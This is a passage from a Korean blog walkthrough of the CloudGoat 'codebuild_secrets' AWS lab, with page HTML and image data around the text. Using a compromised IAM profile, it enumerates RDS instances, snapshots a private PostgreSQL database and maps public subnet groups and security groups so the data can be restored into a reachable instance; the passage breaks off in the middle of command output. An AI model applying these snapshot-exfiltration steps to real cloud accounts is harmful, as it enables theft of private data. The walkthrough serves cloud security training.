string\">\"PLAINTEXT\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACSklEQVQ4y31STW/aQBBdMPEn4G/8JRMCBgxJAdsYQkgIgihtb5VaqYe2Uiv1UKVS///tVbMhSZVUOYzeeL3zdubNY2E4hWWnYBUPstKGIASoCgGY4kJoeqjpPiTVg6L5kFUP9WbIQ6370BoB6s0IouxCq4c4klwwQTQhKg5s9xhaw4frd+GHCaIoha7HkCQHouSgWjPBqjpYpXkfPL//rgg6WJXQAKMfstrCan2LrLjGrNjwfL15jzfTCySDHJ3uBEeSw4uJ+LVgxCocWTCsY7T8BK2gD9s9gR8OoJsxdLMNw2pzpJHp/quEjwmrQ2uEGJ0u4UdDFOUWs3zDOxyOSsTHp1yr5wTPH2APh4rmQa0HnJSQuiIkSR6KuEak3SH+PX9BSEFjpeMFoniMaXaFs8kFhuOSd0idn/Sm8MMhvKAPyznhuv63Q9KwJlr8gml3uEUcrwfL6fCzmmhzlJQWtwtpSTnVPZEZPBhtTlJdJIMM/bTAcDRHEA3Q6ZxxYpKAuiECxg6WqRws8zB+hYioOxNMVkLISgTD7MF2BrCsBKaVoBGkaJoxDCuG6/W4mUXZOYTNUVJc/pCm27B8HZJmgH3/vcCPP3N8/jnCt7spvv6a4MvdBMmHj+ifLbFabVGUl8jyC+TzNcrFFYr5JRbLDWb5OXq9DPmqjf0nFV5sgu3erXF9u8R6V2BzU/J8+7bEvFyhXO5Rnu+Rz7ePyyKTd7pTjuTXFyNn+R7dpEQ6WmOYrjA+vcQs2/GibjLj3qNN0mIo7hf4hM+X8hfEn0ioXwjWQAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/9c1620db635f6577a66c0dc285e4630d/37523/4.png\"\n        srcset=\"/static/9c1620db635f6577a66c0dc285e4630d/e9ff0/4.png 180w,\n/static/9c1620db635f6577a66c0dc285e4630d/f21e7/4.png 360w,\n/static/9c1620db635f6577a66c0dc285e4630d/37523/4.png 720w,\n/static/9c1620db635f6577a66c0dc285e4630d/5a190/4.png 800w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 프로필을 등록해주고 사용할 수 있는 권한이 무엇이 있는지 열거해보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC30lEQVQ4y1VUyXLaUBCUl7hSlbCaHYFAQhJoX5DEYrCxTcIth5QPPuSUa/L/x071yDjJ4ZWenma6e3rmSXn5aePbjym+vvRwehni+NrB68HFL+c7fmsnpFoKzYowVOfoD21oug/DjGEvMizcAjMrge1kmDs5rm9uoRTrE5b5EV6wg2nn0I0Uw7GHemeKjmqjp9oC1BvYGGmuPLt9821vod2dYaDO5ezqQxOKG6wQxFt44RozK4ZhRgJQqQ7RauuoNUao1lW0OgaarQk+Vwdotqe4bU/RuNUEdDhaoNXRcXndgJJmD/DCDRxvhakRigJVc4WV5TC4/7YfqAu0uwYWXgHXXwkxQaiMSwDj5T30WSRguhmh27cErNObYTzxBFDTA2hTHxM9gDp25JzvzKHKWmMsiqXkrHgUg8/rnPCvwkZrIo2YGKEAcc8qKITflYsaFKVSKlxvvyCI7pCvn5HmB5h2Kh1jcJzuBZQEq80Ry/yAINoiTu/ByqJkj4Wbw7QT8Vi5rJWAfrTFsngUAAJZ86WURyKqGU08JMsHsBrXX4O+h/Edis0RcydDvnqSrlPlOyCDyEqFBKQ/BKRCBvMbY9gMEidUmO6lGjb1U2XwVyHLyIonpNlBFHJQRWF8J+/0leWKwmCNMN6JPaI2P4iPlZqKi6s6B/sZXrApFaZ7WPMU1qIs2Q+3pfFjR74xhuPF8yR7kEroJ4ea6qQpZOZcRclOAtmAcyNY3sQIpOO0hb4RkAJoB68ePSTpzcc2lMt6CegI4B5+uBHv6OM7oF4C0pYw2QkAiQlKESRnHm+KclEt55CJNJnecBbPXWYiCXgj+K0ck0LOzzmMpa8UIF1my2kuPSIT5Utn3xSSgMPMUlky37lnzvkvQ3LeFvGQA0smls6ETt98v3oMZAdpOvdyQ8bOf9eQHjOHYyOALIf1M4mLf5dma4pqY4RW1xDman0kPw3GkojrTMrFe8wuc2z+AJ4r8CSaczG1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/cac153e4893fa9dbb9553a0cb4bf5760/37523/5.png\"\n        srcset=\"/static/cac153e4893fa9dbb9553a0cb4bf5760/e9ff0/5.png 180w,\n/static/cac153e4893fa9dbb9553a0cb4bf5760/f21e7/5.png 360w,\n/static/cac153e4893fa9dbb9553a0cb4bf5760/37523/5.png 720w,\n/static/cac153e4893fa9dbb9553a0cb4bf5760/97655/5.png 819w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM User, “calrissian”은 “EC2, “RDS” 관련 권한이 있는 것을 확인할 수 있으며 RDS 인스턴스가 있는지를 확인해보았습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds describe<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"DBInstances[*].[DBInstanceIdentifier, Engine , DBName]\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAElEQVQY013I20vCYABA8W9mBF4oRYKkcpvzMpdzpnORn6bzkthKqDCrh4QkCYQCX/vfTyQ9+fDjwBH92xJfP5L5qsLHus77d53l2sF+naLakk67h+14yHYfvzemKXsbl9Kn618j5Yi7Z5PZZ5rkYQrhuGdMph1Gkybje0nweMUwaOAORuQsj65/g1X2qNZa6IZNrlClceGTL56jZ21qbgfHtcnkU+xFkgg5MHhbVXiYF3hamMwWFi/LIlYwJG3U0HWT45M8qlbiVDXJaCWyRhlNt8ioJqpmU/GOcFpRIvEDhBKOo4SjhHZjG0r4r1F2lAhCxP7Ft7r99xEigQgl+AW6EXhPGlhfNAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/0a377bf0758d9df5a7deb4d0c36ac7e0/37523/6.png\"\n        srcset=\"/static/0a377bf0758d9df5a7deb4d0c36ac7e0/e9ff0/6.png 180w,\n/static/0a377bf0758d9df5a7deb4d0c36ac7e0/f21e7/6.png 360w,\n/static/0a377bf0758d9df5a7deb4d0c36ac7e0/37523/6.png 720w,\n/static/0a377bf0758d9df5a7deb4d0c36ac7e0/f73a1/6.png 822w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">cg<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>codebuild<span class=\"token operator\">-</span>secrets<span class=\"token operator\">-</span>cgidq5cx1pvldn        postgres        securedb</code></pre></div>\n<ul>\n<li>AWS 계정에서 <code class=\"language-text\">postgreSQL</code> 을 사용하는 RDS 인스턴스가 존재는 하지만 Public 형태로 접근이 불가능하기 불가능하지만 해당 database 명을 보면 <code class=\"language-text\">securedb</code> 명칭되어 있어 맛있어 보입니다.</li>\n</ul>\n<h3 id=\"rds-instance-snapshot\" style=\"position:relative;\"><a href=\"#rds-instance-snapshot\" aria-label=\"rds instance snapshot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDS Instance SnapShot</h3>\n<p><strong>Database Snapshopt 기능</strong></p>\n<ul>\n<li>AWS RDS는 개별 데이터베이스가 아닌 전체 DB 인스턴스를 백업하여 DB 인스턴스의 스토리지 볼륨 스냅샷을 생성합니다.</li>\n<li>단인 AZ DB 인스턴스에서 해당 DB 스냅샷을 생성하면 잠시 I/O 가 중단되는데 해당 DB 인스턴스의 크기 및 클래스에 따라 대체로 몇 초에서 몇 분 정도 지속되어집니다.</li>\n<li><code class=\"language-text\">MariaDB, MySQL, Oracle, PostgreSQL...</code> 의 경우 다중 AZ 배포에 대한 백업 시 기본 AZ에서는 I/O 작업이 중단이 되질 않습니다.</li>\n<li>PostgreSQL DB 인스턴스의 겨우 로그되지 않은 테이블의 데이터가 스냅샷에서 복원되지 않을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds create<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>snapshot <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>snapshot<span class=\"token operator\">-</span>identifier secrets<span class=\"token operator\">-</span>snapshot <span class=\"token operator\">-</span><span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>identifier cg<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>codebuild<span class=\"token operator\">-</span>secrets<span class=\"token operator\">-</span>cgidq5cx1pvldn <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<ul>\n<li>실행 중인 RDS Instance의 snapshot을 생성한 다음 해당 스냅샷을 제어할 수 있든 또 다른 RDS 인스턴스를 생성하고 여기서 Security를 추출해 보겠습니다.</li>\n<li>스냅샷에서 RDS 인스턴스를 생성한 후 Public으로 생성한 RDS 인스턴스에 액세스할 수 있으려면 적절한 Subnet과 보안 그룹에 배치되어야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACD0lEQVQ4y31T2XLaQBBcMOCYQ9LqQPeBERJCwiBxmNjBiZPKU/7/ezo1Q4ErKfDD1K5Ko56e7pbIqwWqpsB6X2HZFJe7G8ZQZQRpJlBlCGnE0PQIYyeFbk5gjh9hjqcwrAksewrHyzAYeRCttg5FTRBPanh+hcEoQqdno9Oz0L038TBw8KVvc/NdV4cQQwgxul5tFaLV0dDuSqybI3bP71jVr9gdfiIrtsxmlm8QTSrkxQ5BtIDj5cyM3o2dGbxgzuwULUTrToNodyRfivIZq+aIebnHevOGICpPE0UfoqVwUR/136p/AInJcvWCotwjm2/h+jnCuMQ0q9EfOgx+7r1V9P4COJ3VeFq/onr6ilX9DWnWsAyL6gDbnbEJJD4NodWlkVyGXGX4mK7RbL8zKAGkecO6kSH9ocuG/L/yNQkugPPFHoeX39gdfjE4AdO6JDqxotiQ65+tzAzPF1rt7ccfbPfvqDdv8MMCvQeLY0Ma0tnpGZ+awgypiQCjpGLQIC5huxnHgkKrWxPWi4o0pEEkie1l/HzuIxOHiv8BSEKTu2RGmtWIkiV/TGVYJ0OGincjOpRljU/BGRMjzPItVvWRQSm8rpPC93N4QQGfAu3nl1ALccrlx0l5lacyrAS2m8IaT+B6FI8EUg/RtVLc078sfYxUD6rmQzciaDKANCLuMcwYUo9huQ7iuQLV0PAXlllHMtbfkGYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/0ef09006acf26c6bba794809e9e19201/37523/7.png\"\n        srcset=\"/static/0ef09006acf26c6bba794809e9e19201/e9ff0/7.png 180w,\n/static/0ef09006acf26c6bba794809e9e19201/f21e7/7.png 360w,\n/static/0ef09006acf26c6bba794809e9e19201/37523/7.png 720w,\n/static/0ef09006acf26c6bba794809e9e19201/e80ac/7.png 809w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"DBSnapshot\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"DBSnapshotIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"secrets-snapshot\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBInstanceIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-codebuild-secrets-cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AllocatedStorage\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"creating\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Port\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"AvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1b\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"InstanceCreateTime\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T16:13:44.812000+00:00\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"MasterUsername\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"EngineVersion\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"9.6.22\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"LicenseModel\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgresql-license\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"SnapshotType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"manual\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"OptionGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"default:postgres-9-6\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"PercentProgress\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"StorageType\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"gp2\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Encrypted\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSnapshotArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:rds:us-east-1:&lt;USERID>:snapshot:secrets-snapshot\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"IAMDatabaseAuthenticationEnabled\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"ProcessorFeatures\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DbiResourceId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db-3MLI3HBAAWNMRIHBDXYVCHUIWQ\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"TagList\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>실행 중인 RDS 인스턴스의 서브넷 그룹을 식별해 보기 위해서 서브넷 그룹 이름을 기록해 둡니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds describe<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>subnet<span class=\"token operator\">-</span>groups <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"DBSubnetGroups[?contains(DBSubnetGroupName,'rds')]\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"DBSubnetGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroupDescription\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"SubnetGroupStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Complete\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bb58f8e0a0abe565\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1b\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0bce9dc9a764b6a13\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1a\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroupArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:rds:us-east-1:&lt;USERID>:subgrp:cloud-goat-rds-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"DBSubnetGroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroupDescription\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat codebuild_secrets_cgidq5cx1pvldn Subnet Group ONLY for Testing with Public Subnets\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"VpcId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"vpc-0449676f4c03795ea\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"SubnetGroupStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Complete\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Subnets\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-0845f795b2db8e806\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1b\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"SubnetIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"subnet-08eae70434942222f\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetAvailabilityZone\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"us-east-1a\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetOutpost\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SubnetStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Active\"</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"DBSubnetGroupArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:rds:us-east-1:&lt;USERID>:subgrp:cloud-goat-rds-testing-subnet-group-codebuild_secrets_cgidq5cx1pvldn\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>RDS 서비스와 통신할 수 있는 보안 그룹이 있는지 확인을 해보도록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>security<span class=\"token operator\">-</span>groups <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"SecurityGroups[?contains(Description,'RDS')]\"</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile calrissian</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"CloudGoat codebuild_secrets_cgidq5cx1pvldn Security Group for PostgreSQL RDS Instance\"</span><span class=\"token punctuation\">,</span>\n\t        <span class=\"token string\">\"GroupName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-psql-codebuild_secrets_cgidq5cx1pvldn\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"IpPermissions\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"FromPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"IpProtocol\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tcp\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"IpRanges\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"10.10.20.0/24\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"10.10.30.0/24\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"10.10.40.0/24\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"10.10.10.0/24\"</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"CidrIp\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"124.50.41.21/32\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Ipv6Ranges\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"PrefixListIds\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"ToPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"UserIdGroupPairs\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span><span 